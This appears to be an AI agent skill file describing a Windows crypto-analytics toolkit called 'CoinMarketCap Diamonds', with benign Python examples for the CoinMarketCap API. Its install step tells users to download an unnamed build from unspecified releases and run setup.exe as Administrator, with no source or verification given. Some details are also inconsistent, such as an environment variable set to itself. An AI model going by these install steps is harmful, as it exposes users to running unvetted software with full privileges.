---
name: coinmarketcap-diamonds-premium-analytics
description: CoinMarketCap Diamonds premium analytics and trading tools for cryptocurrency market data analysis on Windows
triggers:
  - how do I use CoinMarketCap Diamonds for crypto analytics
  - set up CoinMarketCap premium analytics tools
  - analyze cryptocurrency trading data with Diamonds
  - configure CoinMarketCap Diamonds pro features
  - get premium crypto market insights with Diamonds
  - use CoinMarketCap trading analytics pack
  - access blockchain analytics with CoinMarketCap Diamonds
  - troubleshoot CoinMarketCap Diamonds installation
---

# CoinMarketCap Diamonds Premium Analytics

> Skill by [ara.so](https://ara.so) — Data Skills collection.

CoinMarketCap Diamonds is a Windows-based premium analytics and trading toolkit designed for cryptocurrency market analysis. It provides professional-grade features for tracking blockchain data, analyzing market trends, and executing trading strategies with enhanced CoinMarketCap data integration.

## Installation

### Windows Setup

1. **Download the Application**
   - Download the latest build from the repository releases
   - Extract to a dedicated directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds`)

2. **System Requirements**
   - Windows 10/11 (64-bit)
   - Minimum 4GB RAM (8GB+ recommended)
   - Active internet connection for market data
   - .NET Framework 4.7.2 or higher

3. **Initial Configuration**
   ```powershell
   # Run as Administrator
   cd "C:\Program Files\CoinMarketCap-Diamonds"
   .\setup.exe
   ```

4. **API Configuration**
   - Set up your CoinMarketCap API credentials
   - Store API keys in environment variables:
   ```powershell
   [System.Environment]::SetEnvironmentVariable('CMC_API_KEY', $env:CMC_API_KEY, 'User')
   [System.Environment]::SetEnvironmentVariable('CMC_API_SECRET', $env:CMC_API_SECRET, 'User')
   ```

## Configuration

### Basic Configuration File

Create `config.json` in the installation directory:

```json
{
  "api": {
    "endpoint": "https://pro-api.coinmarketcap.com/v1",
    "timeout": 30000,
    "retries": 3
  },
  "analytics": {
    "updateInterval": 60,
    "cacheEnabled": true,
    "cacheDuration": 300
  },
  "trading": {
    "defaultPair": "BTC/USDT",
    "riskLevel": "medium",
    "autoRefresh": true
  },
  "display": {
    "theme": "dark",
    "chartType": "candlestick",
    "indicators": ["RSI", "MACD", "BB"]
  }
}
```

### Environment Variables

```bash
# API Configuration
CMC_API_KEY=your_api_key_here
CMC_API_SECRET=your_api_secret_here

# Data Storage
CMC_DATA_DIR=C:\Users\YourName\AppData\Local\CoinMarketCap-Diamonds\data
CMC_CACHE_DIR=C:\Users\YourName\AppData\Local\CoinMarketCap-Diamonds\cache

# Analytics Settings
CMC_UPDATE_FREQUENCY=60
CMC_MAX_SYMBOLS=100
```

## Key Features & Usage

### Market Data Analytics

**Real-time Price Tracking**
```python
# Example integration with Python scripts
import os
import requests
import json

API_KEY = os.getenv('CMC_API_KEY')
BASE_URL = 'https://pro-api.coinmarketcap.com/v1'

def get_latest_prices(symbols):
    """Fetch latest cryptocurrency prices"""
    headers = {
        'X-CMC_PRO_API_KEY': API_KEY,
        'Accept': 'application/json'
    }
    
    params = {
        'symbol': ','.join(symbols),
        'convert': 'USD'
    }
    
    response = requests.get(
        f'{BASE_URL}/cryptocurrency/quotes/latest',
        headers=headers,
        params=params
    )
    
    return response.json()

# Usage
symbols = ['BTC', 'ETH', 'BNB']
data = get_latest_prices(symbols)
print(json.dumps(data, indent=2))
```

**Historical Data Analysis**
```python
def get_historical_data(symbol, time_start, time_end):
    """Retrieve historical OHLCV data"""
    headers = {'X-CMC_PRO_API_KEY': os.getenv('CMC_API_KEY')}
    
    params = {
        'symbol': symbol,
        'time_start': time_start,
        'time_end': time_end,
        'interval': '1h'
    }
    
    response = requests.get(
        f'{BASE_URL}/cryptocurrency/ohlcv/historical',
        headers=headers,
        params=params
    )
    
    return response.json()['data']['quotes']

# Analyze last 30 days
from datetime import datetime, timedelta
end = datetime.now()
start = end - timedelta(days=30)

btc_history = get_historical_data('BTC', start.isoformat(), end.isoformat())
```

### Trading Analytics

**Portfolio Performance Tracking**
```python
class PortfolioAnalyzer:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = 'https://pro-api.coinmarketcap.com/v1'
    
    def calculate_portfolio_value(self, holdings):
        """
        Calculate total portfolio value
        holdings: dict {'BTC': 0.5, 'ETH': 10, ...}
        """
        symbols = list(holdings.keys())
        prices = self.get_latest_prices(symbols)
        
        total_value = 0
        for symbol, amount in holdings.items():
            price = prices['data'][symbol]['quote']['USD']['price']
            total_value += price * amount
        
        return total_value
    
    def get_latest_prices(self, symbols):
        headers = {'X-CMC_PRO_API_KEY': self.api_key}
        params = {'symbol': ','.join(symbols), 'convert': 'USD'}
        
        response = requests.get(
            f'{self.base_url}/cryptocurrency/quotes/latest',
            headers=headers,
            params=params
        )
        return response.json()

# Usage
analyzer = PortfolioAnalyzer(os.getenv('CMC_API_KEY'))
portfolio = {'BTC': 0.25, 'ETH': 5, 'BNB': 50}
value = analyzer.calculate_portfolio_value(portfolio)
print(f"Total Portfolio Value: ${value:,.2f}")
```

### Technical Indicators

**RSI Calculator**
```python
import pandas as pd

def calculate_rsi(prices, period=14):
    """Calculate Relative Strength Index"""
    df = pd.DataFrame(prices)
    delta = df['close'].diff()
    
    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()
    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()
    
    rs = gain / loss
    rsi = 100 - (100 / (1 + rs))
    
    return rsi

# Get historical data and calculate RSI
historical_data = get_historical_data('BTC', start, end)
prices = [{'close': quote['quote']['USD']['close']} for quote in historical_data]
rsi_values = calculate_rsi(prices)
print(f"Current RSI: {rsi_values.iloc[-1]:.2f}")
```

**MACD Analysis**
```python
def calculate_macd(prices, fast=12, slow=26, signal=9):
    """Calculate MACD indicator"""
    df = pd.DataFrame(prices)
    
    ema_fast = df['close'].ewm(span=fast, adjust=False).mean()
    ema_slow = df['close'].ewm(span=slow, adjust=False).mean()
    
    macd_line = ema_fast - ema_slow
    signal_line = macd_line.ewm(span=signal, adjust=False).mean()
    histogram = macd_line - signal_line
    
    return {
        'macd': macd_line,
        'signal': signal_line,
        'histogram': histogram
    }
```

## Common Patterns

### Automated Market Alerts

```python
class MarketAlertSystem:
    def __init__(self, api_key):
        self.api_key = api_key
        self.alerts = []
    
    def add_price_alert(self, symbol, target_price, condition='above'):
        """Add price alert"""
        self.alerts.append({
            'symbol': symbol,
            'target': target_price,
            'condition': condition
        })
    
    def check_alerts(self):
        """Check if any alerts are triggered"""
        current_prices = self.get_latest_prices([a['symbol'] for a in self.alerts])
        
        triggered = []
        for alert in self.alerts:
            current = current_prices['data'][alert['symbol']]['quote']['USD']['price']
            
            if alert['condition'] == 'above' and current >= alert['target']:
                triggered.append(alert)
            elif alert['condition'] == 'below' and current <= alert['target']:
                triggered.append(alert)
        
        return triggered

# Usage
alerts = MarketAlertSystem(os.getenv('CMC_API_KEY'))
alerts.add_price_alert('BTC', 50000, 'above')
alerts.add_price_alert('ETH', 3000, 'below')
```

### Data Export for Analysis

```python
def export_to_csv(symbol, days=30):
    """Export cryptocurrency data to CSV"""
    from datetime import datetime, timedelta
    import csv
    
    end = datetime.now()
    start = end - timedelta(days=days)
    
    data = get_historical_data(symbol, start.isoformat(), end.isoformat())
    
    filename = f"{symbol}_data_{days}days.csv"
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['timestamp', 'open', 'high', 'low', 'close', 'volume'])
        
        for quote in data:
            q = quote['quote']['USD']
            writer.writerow([
                quote['timestamp'],
                q['open'],
                q['high'],
                q['low'],
                q['close'],
                q['volume']
            ])
    
    return filename
```

## CLI Commands

If using command-line interface:

```powershell
# Launch the application
.\CoinMarketCap-Diamonds.exe

# Update market data
.\CoinMarketCap-Diamonds.exe --update

# Export data to CSV
.\CoinMarketCap-Diamonds.exe --export BTC --days 30 --output data\btc.csv

# Run analytics report
.\CoinMarketCap-Diamonds.exe --analyze --symbols BTC,ETH,BNB --report-type summary

# Clear cache
.\CoinMarketCap-Diamonds.exe --clear-cache
```

## Troubleshooting

### API Connection Issues

```python
def test_api_connection():
    """Test CoinMarketCap API connectivity"""
    try:
        headers = {'X-CMC_PRO_API_KEY': os.getenv('CMC_API_KEY')}
        response = requests.get(
            'https://pro-api.coinmarketcap.com/v1/key/info',
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            print("✓ API connection successful")
            data = response.json()['data']
            print(f"Plan: {data['plan']['plan_name']}")
            print(f"Credits: {data['usage']['current_day']['credits_used']}/{data['usage']['current_day']['credits_limit']}")
        else:
            print(f"✗ API error: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"✗ Connection failed: {str(e)}")

test_api_connection()
```

### Common Issues

**Rate Limiting**
- Default API limits: 333 calls/day (basic), 10,000 calls/month (pro)
- Implement caching to reduce API calls
- Use bulk endpoints when possible

**Data Refresh Issues**
```python
# Clear local cache
import shutil
cache_dir = os.getenv('CMC_CACHE_DIR')
if os.path.exists(cache_dir):
    shutil.rmtree(cache_dir)
    os.makedirs(cache_dir)
```

**Missing Dependencies**
```powershell
# Install required Python packages
pip install requests pandas numpy matplotlib
```

### Performance Optimization

```python
# Use connection pooling for multiple requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def create_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=1)
    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=20)
    session.mount('https://', adapter)
    return session

session = create_session()
```

## Best Practices

1. **API Key Security**: Always use environment variables, never hardcode keys
2. **Rate Limiting**: Implement exponential backoff for API calls
3. **Data Caching**: Cache frequently accessed data to reduce API usage
4. **Error Handling**: Always wrap API calls in try-except blocks
5. **Logging**: Maintain logs for debugging and audit trails

```python
import logging

logging.basicConfig(
    filename='coinmarketcap_diamonds.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)
logger.info("Application started")
```
